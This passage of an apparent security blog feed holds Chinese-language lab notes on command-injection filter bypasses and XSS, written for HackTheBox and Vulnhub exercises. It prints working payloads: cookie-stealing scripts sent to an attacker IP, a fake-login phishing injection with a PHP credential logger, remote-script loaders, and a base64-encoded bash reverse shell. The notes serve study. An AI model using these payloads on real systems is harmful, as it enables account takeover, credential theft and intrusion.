id="Command-Injection-Methods"><a href="#Command-Injection-Methods" class="headerlink" title="Command Injection Methods"></a>Command Injection Methods</h2><p>要将附加命令注入到预期命令中，我们可以使用以下任何运算符：</p><table><thead><tr><th><strong>Injection Operator</strong></th><th><strong>Injection Character</strong></th><th><strong>URL-Encoded Character</strong></th><th><strong>Executed Command</strong></th></tr></thead><tbody><tr><td>Semicolon</td><td><code>;</code></td><td><code>%3b</code></td><td>Both</td></tr><tr><td>New Line</td><td><code>\n</code></td><td><code>%0a</code></td><td>Both</td></tr><tr><td>Background</td><td><code>&amp;</code></td><td><code>%26</code></td><td>Both (second output generally shown first)</td></tr><tr><td>Pipe</td><td>&#96;</td><td>&#96;</td><td><code>%7c</code></td></tr><tr><td>AND</td><td><code>&amp;&amp;</code></td><td><code>%26%26</code></td><td>Both (only if first succeeds)</td></tr><tr><td>OR</td><td>&#96;</td><td></td><td>&#96;</td></tr><tr><td>Sub-Shell</td><td>&#96;&#96;&#96;&#96;</td><td><code>%60%60</code></td><td>Both (Linux-only)</td></tr><tr><td>Sub-Shell</td><td><code>$()</code></td><td><code>%24%28%29</code></td><td>Both (Linux-only)</td></tr></tbody></table><p>注意：唯一的例外可能是分号；，如果使用Windows命令行（CMD）执行命令，则该命令将不起作用，但如果使用Windows PowerShell执行命令，该命令仍将起作用。</p><table><thead><tr><th><strong>Injection Type</strong></th><th><strong>Operators</strong></th></tr></thead><tbody><tr><td>SQL Injection</td><td><code>&#39;</code> <code>,</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Command Injection</td><td><code>;</code> <code>&amp;&amp;</code></td></tr><tr><td>LDAP Injection</td><td><code>*</code> <code>(</code> <code>)</code> <code>&amp;</code> &#96;</td></tr><tr><td>XPath Injection</td><td><code>&#39;</code> <code>or</code> <code>and</code> <code>not</code> <code>substring</code> <code>concat</code> <code>count</code></td></tr><tr><td>OS Command Injection</td><td><code>;</code> <code>&amp;</code> &#96;</td></tr><tr><td>Code Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code> <code>$()</code> <code>$&#123;&#125;</code> <code>#&#123;&#125;</code> <code>%&#123;&#125;</code> <code>^</code></td></tr><tr><td>Directory Traversal&#x2F;File Path Traversal</td><td><code>../</code> <code>..\\</code> <code>%00</code></td></tr><tr><td>Object Injection</td><td><code>;</code> <code>&amp;</code> &#96;</td></tr><tr><td>XQuery Injection</td><td><code>&#39;</code> <code>;</code> <code>--</code> <code>/* */</code></td></tr><tr><td>Shellcode Injection</td><td><code>\x</code> <code>\u</code> <code>%u</code> <code>%n</code></td></tr><tr><td>Header Injection</td><td><code>\n</code> <code>\r\n</code> <code>\t</code> <code>%0d</code> <code>%0a</code> <code>%09</code></td></tr></tbody></table><h2 id="Blacklisted-Characters"><a href="#Blacklisted-Characters" class="headerlink" title="Blacklisted Characters"></a>Blacklisted Characters</h2><p>web应用程序可能有一个列入黑名单的字符列表，如果命令中包含这些字符，它将拒绝请求。PHP代码可能如下所示：</p><pre><code class="php">$blacklist = [&#39;&amp;&#39;, &#39;|&#39;, &#39;;&#39;, ...SNIP...];foreach ($blacklist as $character) &#123;    if (strpos($_POST[&#39;ip&#39;], $character) !== false) &#123;        echo &quot;Invalid input&quot;;    &#125;&#125;</code></pre><h2 id="Identifying-Blacklisted-Character"><a href="#Identifying-Blacklisted-Character" class="headerlink" title="Identifying Blacklisted Character"></a>Identifying Blacklisted Character</h2><p>我们将请求减少到一次一个字符，看看它何时被阻止。</p><h2 id="Bypass-Blacklisted-Spaces"><a href="#Bypass-Blacklisted-Spaces" class="headerlink" title="Bypass Blacklisted Spaces"></a>Bypass Blacklisted Spaces</h2><p>我们会看到，大多数注射经营者确实被列入黑名单。但是，换行符通常不会被列入黑名单，因为有效负载本身可能需要它。我们知道，在Linux和Windows中，换行符都可以用于附加命令，所以让我们尝试将其用作注入运算符：</p><h4 id="Using-Tabs"><a href="#Using-Tabs" class="headerlink" title="Using Tabs"></a>Using Tabs</h4><p>使用制表符（%09）而不是空格是一种可行的技术，因为Linux和Windows都接受参数之间带有制表符的命令，并且它们的执行方式相同</p><ul><li><code>%0a</code>：这表示 ASCII 值为 10 的字符，它是换行符（Line Feed，LF）的 ASCII 值。</li><li><code>%09</code>：这表示 ASCII 值为 9 的字符，它是水平制表符（Tab）的 ASCII 值。</li></ul><h4 id="Using-IFS"><a href="#Using-IFS" class="headerlink" title="Using $IFS"></a>Using $IFS</h4><p>使用（$IFS）Linux环境变量也可以工作，因为它的默认值是一个空格和一个选项卡，可以在命令参数之间工作。因此，如果我们在空格所在的位置使用${IFS}，则变量应自动替换为空格，并且我们的命令应该有效。</p><blockquote><p><code>$IFS</code> 是一个环境变量，在 Unix 和类 Unix 操作系统中使用。它代表 “Internal Field Separator”（内部字段分隔符），用于定义用于分隔字符的字符串。</p></blockquote><h4 id="Using-Brace-Expansion"><a href="#Using-Brace-Expansion" class="headerlink" title="Using Brace Expansion"></a>Using Brace Expansion</h4><p>还有许多其他方法可以用来绕过空间过滤器。例如，我们可以使用Bash-Brace Expansion功能，该功能会自动在大括号之间的参数之间添加空格，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ &#123;ls,-la&#125;</code></pre><h1 id="Bypassing-Other-Blacklisted-Characters"><a href="#Bypassing-Other-Blacklisted-Characters" class="headerlink" title="Bypassing Other Blacklisted Characters"></a>Bypassing Other Blacklisted Characters</h1><p>除了注入运算符和空格字符外，一个非常常见的黑名单字符是斜杠（&#x2F;）或反斜杠（\）字符，因为在Linux或Windows中指定目录是必要的。我们可以使用多种技术来生成我们想要的任何字符，同时避免使用列入黑名单的字符。</p><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><p>我们可以利用许多技术在有效载荷中设置斜线。我们可以用来替换斜杠（或任何其他字符）的一种技术是通过&#x3D;&#x3D;Linux环境变量&#x3D;&#x3D;，就像我们对${IFS}所做的那样。虽然${IFS}被直接替换为空格，但斜杠或分号没有这样的环境变量。然而，这些字符可以在环境变量中使用，并且我们可以指定字符串的开始和长度来完全匹配这个字符。 例如，如果我们查看Linux中的$PATH环境变量，它可能如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $&#123;PATH&#125;/usr/local/bin:/usr/bin:/bin:/usr/games</code></pre><p>因此，如果我们从0字符开始，并且只使用长度为1的字符串，那么我们将只使用&#x2F;字符，我们可以在有效载荷中使用：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $&#123;PATH:0:1&#125;/</code></pre><blockquote><p>参数扩展语法是 Shell 编程中一种用于操作和处理变量值的特殊语法。它允许你从变量值中提取子字符串、执行替换操作、计算长度等等。参数扩展可以用于在脚本中处理字符串、变量和命令的输出。</p><p>在大多数 Unix-like Shell（如 Bash、Zsh、sh 等）中，有几种常用的参数扩展形式：</p><ol><li><code>$&#123;variable&#125;</code>：用于引用变量的值。例如，<code>$&#123;PATH&#125;</code> 表示引用 <code>PATH</code> 变量的值。</li><li><code>$&#123;variable:-default&#125;</code>：如果变量未定义或为空，则使用默认值。例如，<code>$&#123;USERNAME:-guest&#125;</code> 表示如果 <code>USERNAME</code> 变量未定义或为空，使用默认值 “guest”。</li><li><code>$&#123;variable:=default&#125;</code>：如果变量未定义或为空，则将其设置为默认值。例如，<code>$&#123;EDITOR:=nano&#125;</code> 表示如果 <code>EDITOR</code> 变量未定义或为空，设置为 “nano”。</li><li><code>$&#123;variable:offset:length&#125;</code>：从变量值中提取子字符串。例如，<code>$&#123;NAME:0:3&#125;</code> 表示从 <code>NAME</code> 变量的值中提取前三个字符。</li><li><code>$&#123;variable#pattern&#125;</code> 和 <code>$&#123;variable##pattern&#125;</code>：从变量值的开头移除匹配的模式。<code>#</code> 会移除最短匹配，<code>##</code> 会移除最长匹配。</li><li><code>$&#123;variable%pattern&#125;</code> 和 <code>$&#123;variable%%pattern&#125;</code>：从变量值的末尾移除匹配的模式。<code>%</code> 会移除最短匹配，<code>%%</code> 会移除最长匹配。</li><li>&#96;$</li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;检测基本操作系统命令注入漏洞的过程与利用此类漏洞的过程相同。我们试图通过各种注入方法附加我们的命令。如果命令输出与预期的通常结果不同，则我们已成功利用该漏洞。对于更高级的命令注入漏洞，情况可能并非如此，因为我们可能会利用各种模糊方法或代码审查来识别潜在的命令注入弱点。然后，我们可以逐步构建我们的有效载荷，直到我们实现命令注入。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="https://taninluv.github.io/2023/08/15/XSS/"/>
    <id>https://taninluv.github.io/2023/08/15/XSS/</id>
    <published>2023-08-15T08:05:13.000Z</published>
    <updated>2023-08-18T10:37:21.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS-Testing-Payloads"><a href="#XSS-Testing-Payloads" class="headerlink" title="XSS Testing Payloads"></a>XSS Testing Payloads</h2><p>我们可以通过以下基本XSS负载来测试页面是否易受XSS攻击：</p><pre><code class="html">&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></pre><span id="more"></span><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>XSS Payloads</strong></td><td></td></tr><tr><td><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></td><td>Basic XSS Payload</td></tr><tr><td><code>&lt;plaintext&gt;</code></td><td>Basic XSS Payload</td></tr><tr><td><code>&lt;script&gt;print()&lt;/script&gt;</code></td><td>Basic XSS Payload</td></tr><tr><td><code>&lt;img src=&quot;&quot; onerror=alert(window.origin)&gt;</code></td><td>HTML-based XSS Payload</td></tr><tr><td><code>&lt;script&gt;document.body.style.background = &quot;#141d2b&quot;&lt;/script&gt;</code></td><td>Change Background Color</td></tr><tr><td><code>&lt;script&gt;document.body.background = &quot;https://www.hackthebox.eu/images/logo-htb.svg&quot;&lt;/script&gt;</code></td><td>Change Background Image</td></tr><tr><td><code>&lt;script&gt;document.title = &#39;HackTheBox Academy&#39;&lt;/script&gt;</code></td><td>Change Website Title</td></tr><tr><td><code>&lt;script&gt;document.getElementsByTagName(&#39;body&#39;)[0].innerHTML = &#39;text&#39;&lt;/script&gt;</code></td><td>Overwrite website’s main body</td></tr><tr><td><code>&lt;script&gt;document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;</code></td><td>Remove certain HTML element</td></tr><tr><td><code>&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;</code></td><td>Load remote script</td></tr><tr><td><code>&lt;script&gt;new Image().src=&#39;http://OUR_IP/index.php?c=&#39;+document.cookie&lt;/script&gt;</code></td><td>Send Cookie details to us</td></tr><tr><td><strong>Commands</strong></td><td></td></tr><tr><td><code>python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;</code></td><td>Run <code>xsstrike</code> on a url parameter</td></tr><tr><td><code>sudo nc -lvnp 80</code></td><td>Start <code>netcat</code> listener</td></tr><tr><td><code>sudo php -S 0.0.0.0:80</code></td><td>Start <code>PHP</code> server</td></tr></tbody></table><blockquote><p>提示：许多现代web应用程序使用跨域IFrame来处理用户输入，因此即使web表单易受XSS攻击，它也不会成为主web应用程序上的漏洞。这就是为什么我们在警告框中显示window.origin的值，而不是像1这样的静态值。在这种情况下，警报框会显示它正在执行的URL，并确认哪个表单是易受攻击的表单，以防使用IFrame。</p></blockquote><p>由于一些现代浏览器可能会在特定位置阻止<code>alert（）</code>JavaScript函数，因此了解一些其他基本的XSS有效载荷来验证XSS的存在可能会很方便。一个这样的XSS有效载荷是＜明文＞，它将停止呈现后面的HTML代码，并将其显示为明文。另一个容易发现的负载是<code>&lt;script&gt;print（）&lt;/script&gt;</code>，它将弹出浏览器打印对话框，任何浏览器都不太可能阻止它。试着使用这些有效载荷来看看每个有效载荷是如何工作的。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.</p><p><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></p><p>输入测试注入后发现可以触发XSS漏洞：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151618784.png" alt="image-20230815161839658"></p><p>然如注入</p><p><code>&lt;script&gt;alert( document.cookie)&lt;/script&gt;</code></p><p>从DOM读取cookie并反弹即可</p><h1 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h1><p>有两种类型的非持久性XSS漏洞：反射XSS，由后端服务器处理；基于DOM的XSS，完全在客户端处理，永远不会到达后端服务器。与持久XSS不同，非持久XSS漏洞是暂时的，通过页面刷新不会持久存在。因此，我们的攻击只影响目标用户，不会影响访问该页面的其他用户。 当我们的输入到达后端服务器并在未经过滤或净化的情况下返回给我们时，就会出现反映的XSS漏洞。在许多情况下，我们的整个输入可能会返回给我们，比如错误消息或确认消息。在这些情况下，我们可能会尝试使用XSS有效载荷来查看它们是否执行。然而，由于这些通常是临时消息，一旦我们离开页面，它们就不会再次执行，因此它们是非持久性的。</p><p>正如我们所看到的，单引号确实包含我们的XSS负载“＜script＞alert（window.origin）&lt;&#x2F;script＞”。 如果我们再次访问Reflected页面，错误消息将不再出现，并且我们的XSS负载也不会执行，这意味着这个XSS漏洞确实是非持久性的。 但是，如果XSS漏洞是非持久性的，我们将如何用它来瞄准受害者？ 这取决于使用哪个HTTP请求将我们的输入发送到服务器。我们可以通过Firefox开发工具点击[CTRL+I]并选择“网络”选项卡来检查这一点。然后，我们可以再次放入测试负载，并点击“添加”发送它</p><p>正如我们所看到的，第一行显示我们的请求是一个GET请求。GET请求将它们的参数和数据作为URL的一部分发送。因此，为了针对用户，我们可以向他们发送一个包含我们的有效负载的URL。要获取URL，我们可以在发送XSS负载后从Firefox的URL栏中复制URL，也可以右键单击“网络”选项卡中的get请求，然后选择“复制”&gt;“复制URL”。一旦受害者访问此URL，XSS负载将执行</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p>这里发送payload后在浏览器中找到了该请求，然后可以复制其url发送给其他用户触发XSS，curl也是可以的：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151635364.png" alt="image-20230815163500315"></p><h1 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h1><pre><code class="javascript">document.getElementById(&quot;todo&quot;).innerHTML = &quot;&lt;b&gt;Next Task:&lt;/b&gt; &quot; + decodeURIComponent(task);</code></pre><p>我们可以看到，我们可以控制输入，而输出没有被净化，所以这个页面应该容易受到DOM XSS的攻击。</p><h2 id="DOM-Attacks"><a href="#DOM-Attacks" class="headerlink" title="DOM Attacks"></a>DOM Attacks</h2><p>如果我们尝试以前使用过的XSS负载，我们会发现它不会执行。这是因为innerHTML函数不允许将其中的＜script＞标记用作安全功能。尽管如此，我们使用的许多其他XSS有效载荷都不包含＜script＞标签，比如下面的XSS有效负载：</p><pre><code class="html">&lt;img src=&quot;&quot; onerror=alert(window.origin)&gt;</code></pre><h1 id="XSS-Discovery"><a href="#XSS-Discovery" class="headerlink" title="XSS Discovery"></a>XSS Discovery</h1><h2 id="Automated-Discovery"><a href="#Automated-Discovery" class="headerlink" title="Automated Discovery"></a>Automated Discovery</h2><p>几乎所有的Web应用程序漏洞扫描程序（如Nessus、Burp Pro或ZAP）都具有检测所有三种类型的XSS漏洞的各种功能。这些扫描仪通常进行两种类型的扫描：被动扫描，用于检查客户端代码中是否存在潜在的基于DOM的漏洞；主动扫描，用于发送各种类型的有效载荷，试图通过在页面源中注入有效载荷来触发XSS。</p><p>虽然付费工具在检测XSS漏洞方面通常具有更高的准确性（尤其是在需要安全绕过的情况下），但我们仍然可以找到开源工具来帮助我们识别潜在的XSS漏洞。这些工具通常通过识别网页中的输入字段，发送各种类型的XSS有效载荷，然后比较渲染的页面源，看看是否可以在其中找到相同的有效载荷，这可能表明XSS注入成功。尽管如此，这并不总是准确的，因为有时，即使注入了相同的有效载荷，由于各种原因，也可能无法成功执行，因此我们必须始终手动验证XSS注入。</p><p>可以帮助我们发现XSS的一些常见开源工具是<a href="https://github.com/s0md3v/XSStrike">XSS Strike</a>、<a href="https://github.com/rajeshmajumdar/BruteXSS">Brute XSS</a>和 <a href="https://github.com/epsylon/xsser">XSSer</a>。我们可以通过gitclone将XSS Strike克隆到我们的VM来尝试：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.gitTanin@htb[/htb]$ cd XSStrikeTanin@htb[/htb]$ pip install -r requirements.txtTanin@htb[/htb]$ python xsstrike.py</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ python xsstrike.py -u &quot;http://SERVER_IP:PORT/index.php?task=test&quot;         XSStrike v3.1.4[~] Checking for DOM vulnerabilities [+] WAF Status: Offline [!] Testing parameter: task [!] Reflections found: 1 [~] Analysing reflections [~] Generating payloads [!] Payloads generated: 3072 ------------------------------------------------------------[+] Payload: &lt;HtMl%09onPoIntERENTER+=+confirm()&gt; [!] Efficiency: 100 [!] Confidence: 10 [?] Would you like to continue scanning? [y/N]</code></pre><h2 id="Manual-Discovery"><a href="#Manual-Discovery" class="headerlink" title="Manual Discovery"></a>Manual Discovery</h2><p>当涉及到手动XSS发现时，发现XSS漏洞的难度取决于web应用程序的安全级别。基本XSS漏洞通常可以通过测试各种XSS有效载荷来发现，但识别高级XSS漏洞需要高级代码审查技能。</p><h4 id="XSS-Payloads"><a href="#XSS-Payloads" class="headerlink" title="XSS Payloads"></a>XSS Payloads</h4><p>查找XSS漏洞的最基本方法是针对给定网页中的输入字段手动测试各种XSS有效载荷。我们可以在网上找到XSS有效载荷的巨大列表，比如 [PayloadAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS</a> Injection&#x2F;README.md)上的或<a href="https://github.com/payloadbox/xss-payload-list">PayloadBox</a>中的。然后，我们可以开始逐一测试这些有效载荷，方法是复制每个有效载荷并将其添加到我们的表单中，然后查看是否弹出警报框。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?</p><p> What type of XSS was found on the above server? “name only”</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151738961.png" alt="image-20230815173856882"></p><p>我们使用工具进行扫描后发现email是可以注入xss的，然后把email参数用之前的测试代码测试了一下，发现确实可以：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151740417.png" alt="image-20230815174014373"></p><h1 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h1><p>另一种非常常见的XSS攻击是网络钓鱼攻击。网络钓鱼攻击通常利用看起来合法的信息诱骗受害者将其敏感信息发送给攻击者。XSS网络钓鱼攻击的一种常见形式是通过注入伪造的登录表单，将登录详细信息发送到攻击者的服务器，然后攻击者可以使用该服务器代表受害者登录并控制其帐户和敏感信息。 </p><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><p> 尝试为在上述服务器中的“&#x2F;philishing”中找到的图像URL表单找到一个有效的XSS负载，然后使用您在本节中学到的内容准备一个注入恶意登录表单的恶意URL。然后访问“&#x2F;philish&#x2F;send.php”将URL发送给受害者，他们将登录到恶意登录表单。如果您做得正确，您应该收到受害者的登录凭据，您可以使用该凭据登录到“&#x2F;philishing&#x2F;login.php”并获取标志。</p><p>我们来到钓鱼网站，确认网站可以注入后，尝试注入一个简单的钓鱼表单：</p><pre><code class="html">&lt;div&gt;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;input type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;text&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;/div&gt;</code></pre><p>注入代码：</p><pre><code class="javascript">document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://OUR_IP&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151835805.png" alt="image-20230815183544764"></p><p>在用户‘登录’之前，我们不应该让原页面出现在页面上，这违背了我们的“请登录以继续”这句话。因此，为了鼓励受害者使用登录表单，我们应该删除URL字段，这样他们可能会认为必须登录才能使用该页面。为此，我们可以使用JavaScript函数document.getElementById（）.remove（）函数。 要找到要删除的HTML元素的id，我们可以通过单击[CTRL+SHIFT+C]打开页面检查器选取器，然后单击我们需要的元素可以得到该表单的id，然后将其移除：</p><pre><code class="javascript">document.getElementById(&#39;urlform&#39;).remove();</code></pre><p>我们发现还有一个原始的html代码在我们注入的表单之后，再插入一个注释将其删除：</p><pre><code class="html">...PAYLOAD... &lt;!-- </code></pre><p>完整的payload为：</p><pre><code>&#39;&gt;&lt;script&gt;document.write(&#39;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.16.18&gt;&lt;input type=&quot;username&quot; name=&quot;username&quot; placeholder=&quot;Username&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/form&gt;&#39;);document.getElementById(&#39;urlform&#39;).remove();&lt;/script&gt;&lt;!--</code></pre><p>这里的开头要闭合一下前面的标签</p><p>最后我们得到了一下页面：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151901586.png" alt="image-20230815190115549"></p><p>此时我们用nc监听我们的80端口，然后用test：test”登录”网页：</p><p> <img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151905792.png" alt="image-20230815190550748"></p><p>我们盗取到了用户的凭证，然而，由于我们只使用netcat侦听器进行侦听，它将无法正确处理HTTP请求，受害者将收到“无法连接”错误，这可能会引起一些怀疑。因此，我们可以使用一个基本的PHP脚本来记录HTTP请求中的凭据，然后在不进行任何注入的情况下将受害者返回到原始页面。在这种情况下，受害者可能认为他们成功登录，并将按预期使用图像查看器。</p><pre><code class="php">&lt;?phpif (isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])) &#123;    $file = fopen(&quot;creds.txt&quot;, &quot;a+&quot;);    fputs($file, &quot;Username: &#123;$_GET[&#39;username&#39;]&#125; | Password: &#123;$_GET[&#39;password&#39;]&#125;\n&quot;);    header(&quot;Location: http://SERVER_IP/phishing/index.php&quot;);    fclose($file);    exit();&#125;?&gt;</code></pre><p>这里要把第五行的重定向地址更改为目标地址。<code>Location</code> 是一个 HTTP 响应头，用于指示浏览器重定向到另一个页面。当服务器返回带有 <code>Location</code> 头的响应时，浏览器会根据该头信息将用户自动重定向到指定的 URL。</p><p>写好文件后搭建一个php服务器：</p><p><code>sudo php -S 0.0.0.0:80</code></p><p>具体而言：</p><ul><li><code>sudo</code>: 使用超级用户权限执行命令，可能需要管理员密码验证。</li><li><code>php</code>: 启动 PHP 解释器。</li><li><code>-S</code>: 启动 PHP 内置的 Web 服务器。</li><li><code>0.0.0.0:80</code>: 指定服务器监听的 IP 地址为 0.0.0.0，这表示允许所有可用的网络接口访问。端口为 80，这是默认的 HTTP 端口。</li></ul><p>此时网页就会自动重定向到原网页了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308151919924.png" alt="image-20230815191923844"></p><h1 id="Session-Hijacking"><a href="#Session-Hijacking" class="headerlink" title="Session Hijacking"></a>Session Hijacking</h1><h2 id="Blind-XSS-Detection"><a href="#Blind-XSS-Detection" class="headerlink" title="Blind XSS Detection"></a>Blind XSS Detection</h2><p>盲XSS漏洞通常发生在只有特定用户（例如Admins）才能访问的表单中。一些潜在的例子包括： 联系人表格 评论 用户详细信息 支持票证 HTTP用户代理标头</p><p>我们将看不到我们的输入将如何处理，也看不到它在浏览器中的外观，因为它只会在我们无法访问的某个管理面板中显示给管理员。在正常情况下（即非盲），我们可以测试每个字段，直到我们得到一个警告框，就像我们在整个模块中所做的那样。然而，在这种情况下，由于我们无法访问Admin面板，如果我们看不到如何处理输出，我们如何检测XSS漏洞？</p><p>为此，我们可以使用上一节中使用的相同技巧，即使用JavaScript负载将HTTP请求发送回服务器。如果JavaScript代码被执行，我们将在机器上得到响应，我们就会知道页面确实存在漏洞。 然而，这引入了两个问题： 我们如何才能知道哪个特定领域是脆弱的？由于任何一个字段都可能执行我们的代码，所以我们不知道它们中的哪一个执行了。 我们如何知道要使用什么XSS有效载荷？既然页面可能有漏洞，但有效负载可能不起作用？</p><h2 id="Loading-a-Remote-Script"><a href="#Loading-a-Remote-Script" class="headerlink" title="Loading a Remote Script"></a>Loading a Remote Script</h2><p>在HTML中，我们可以在＜script＞标记中编写JavaScript代码，但我们也可以通过提供其URL来包含远程脚本，如下所示：</p><pre><code class="html">&lt;script src=&quot;http://OUR_IP/script.js&quot;&gt;&lt;/script&gt;</code></pre><p>因此，我们可以使用它来执行虚拟机上提供的远程JavaScript文件。我们可以将请求的脚本名称从script.js更改为我们正在注入的字段的名称，这样，当我们在VM中获得请求时，我们可以识别执行脚本的易受攻击的输入字段</p><p>如果我们收到&#x2F;username的请求，那么我们就知道username字段容易受到XSS的攻击，等等。这样，我们就可以开始测试加载远程脚本的各种XSS有效载荷，并查看其中哪些向我们发送请求。以下是我们可以从PayloadsAllTheThings中使用的几个示例：</p><pre><code class="html">&quot;&gt;&lt;script src=&quot;http://10.10.16.26/script.js&quot;&gt;&lt;/script&gt;</code></pre><pre><code>&quot;&gt;&lt;script new Image().src=&#39;http:/10.10.16.26/index.php?c=&#39;+document.cookie;&gt;&lt;/script&gt;</code></pre><pre><code class="html">&quot;&gt;&lt;script src=http://10.10.16.26&gt;&lt;/script&gt;javascript:eval(&#39;var a=document.createElement(\&#39;script\&#39;);a.src=\&#39;http://10.10.16.26\&#39;;document.body.appendChild(a)&#39;)&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;//10.10.16.26&quot;);a.send();&lt;/script&gt;&lt;script&gt;$.getScript(&quot;http://10.10.16.26&quot;)&lt;/script&gt;</code></pre><h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><p>What is the value of the ‘flag’ cookie?</p><p>网站大概是这么样子：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181824401.png" alt="image-20230818182419290"></p><p>发现没有url回显，只能手工注入检测</p><p>最后测试发现注入点是最下面的website</p><p>注入：</p><pre><code class="js">&quot;&gt;&lt;script src=&quot;http://10.10.16.26:8080/script.js&quot;&gt;&lt;/script&gt;</code></pre><p>然后本地script.js:</p><pre><code>new Image().src=&#39;http://10.10.16.26:8080/index.php?c=&#39;+document.cookie;</code></pre><p>然后用nc监听一下8080端口或者在8080端口启动一个服务器：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181836067.png" alt="image-20230818183623972"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;XSS-Testing-Payloads&quot;&gt;&lt;a href=&quot;#XSS-Testing-Payloads&quot; class=&quot;headerlink&quot; title=&quot;XSS Testing Payloads&quot;&gt;&lt;/a&gt;XSS Testing Payloads&lt;/h2&gt;&lt;p&gt;我们可以通过以下基本XSS负载来测试页面是否易受XSS攻击：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;script&amp;gt;alert(window.origin)&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub_learning</title>
    <link href="https://taninluv.github.io/2023/08/12/vulnhub-learning/"/>
    <id>https://taninluv.github.io/2023/08/12/vulnhub-learning/</id>
    <published>2023-08-12T03:34:50.000Z</published>
    <updated>2023-09-21T03:28:52.707Z</updated>
    
    <content type="html"><![CDATA[<p>记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等</p><span id="more"></span><h1 id="THE-PLANETS-EARTH"><a href="#THE-PLANETS-EARTH" class="headerlink" title="THE PLANETS: EARTH"></a>THE PLANETS: EARTH</h1><p><a href="https://www.cnblogs.com/sainet/p/15638010.html">Vulnhub 靶场 THE PLANETS: EARTH - sainet - 博客园 (cnblogs.com)</a></p><ul><li><p>这个靶机不同于之前只扫描http协议，需要连httpx一起扫描</p></li><li><p>其中需要进行异或加密解密</p></li><li><p>RCE反弹shell的时候被禁用了远程连接，可以使用十六进制编码后直接绕过，或者base64，但是需要一点技巧：</p><pre><code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMS8yNTAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p>这里查询了一下这个逗号：</p></li></ul><pre><code class="GPT">echo 后面直接跟着逗号 ,，这实际上是一种不常见但合法的写法，被称为 Brace Expansion（花括号扩展）。在 Bash 中，花括号 &#123;&#125; 